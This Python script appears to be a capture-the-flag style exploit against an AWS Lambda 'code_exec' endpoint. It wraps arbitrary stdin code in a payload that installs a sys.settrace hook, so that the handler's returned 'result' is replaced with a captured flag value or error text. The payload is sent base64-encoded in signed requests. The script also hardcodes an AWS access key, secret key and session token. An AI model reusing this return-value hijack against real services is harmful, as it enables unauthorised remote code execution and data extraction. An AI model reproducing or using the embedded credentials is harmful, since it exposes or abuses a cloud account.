import requests, base64, time
from aws_requests_auth.aws_auth import AWSRequestsAuth
import json
import sys

auth = AWSRequestsAuth(
    aws_access_key='ASIARYWSMSYIENSDUBKK', 
    aws_secret_access_key='23Fxo5y8Wrp9ls+NNPRc5XJt5Go2uEdI0OUgItO5', 
    aws_token='IQoJb3JpZ2luX2VjELr//////////wEaDGlsLWNlbnRyYWwtMSJHMEUCIDt9DXC8N6K6PDfzGGksybkuf600RZ3wFg6PkjAfYGd2AiEAhqLt5NPZVffyrB42pa/skJfbwoGk3Y1W+EJ3zvN/PKsqtQIIJhAAGgwxMjE3NzQwNTI4ODAiDCqaO9lwxG2KC+mRuSqSAs0YWyPzDDcZBzx9KQ5dFwX7Afgi3U6yQjev7Q/dxx6ITUOpSlNHD53TKUboxaaNjBMLxFdCB10yDBG8mUlYreETa8lzUWiALIGNKGw6wAYR8BZMBW7MlH/aBBx/YB5v+4Vb973P2pS4REXbF7Sb+SI4ri0nQtf2mf7frM6BysQdJ5o427513hvqQSjUsMQYxs6gPjrS1SkxgHOf3zLiQWpUPDjCfFP24+Wgt3iUQRMF3WtN2HtBO0cXjAkaNqCRcjBOZhF/mbZFyruCO4ZmysQJadIc3NrlE8oFzyLQsOLhnjZhngiSAfz9BdC2MaRHNp36WWQ8eZcmU7+/TmvPZ1rC/YQvmKXkGT+ktxHbLpF2qEEw8efM0wY6nQGSGx4kBcjgCaCaV4pUQ6k7A25YG28ozkplKrUR+ib49ukaB2vMHS0ZIy495FDt1wvD9Y7W/+0f+KQPDPvxLJ1AXN5OY4cpmeF6ug9fJdPmaTRZDfpe8l9H3oXuE9YBDq3SOEiOLm0Xqnnmmq8LJGeeQ8eNSAg5uVDaKWf7wH2+bB58XRg6B41WWOj8IqS9b7c/NIVaZ2d7W9jr031W', 
    aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com', 
    aws_region='us-east-1', 
    aws_service='execute-api'
)
URL = 'https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec'

def run_in_lambda(code_str):
    code = f'''
def trace_func(frame, event, arg, m=__import__('__main__')):
    try:
        if event == 'return' and frame.f_code.co_name == 'lambda_handler':
            if isinstance(arg, dict) and 'result' in arg:
                arg['result'] = m.my_flag_val
    except:
        pass
    return m.trace_func

import __main__, sys
try:
{chr(10).join("    " + line for line in code_str.split(chr(10)))}
except Exception as e:
    __main__.my_flag_val = type(e).__name__ + ':' + str(e)

__main__.trace_func = trace_func
sys.settrace(__main__.trace_func)
try:
    f = sys._getframe(1)
    f.f_trace = __main__.trace_func
except:
    pass
'''
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    resp = requests.post(URL, json={'code': encoded_code}, auth=auth)
    try:
        return resp.json().get('result', resp.text)
    except:
        return resp.text

if __name__ == '__main__':
    code_to_run = sys.stdin.read()
    print(run_in_lambda(code_to_run))
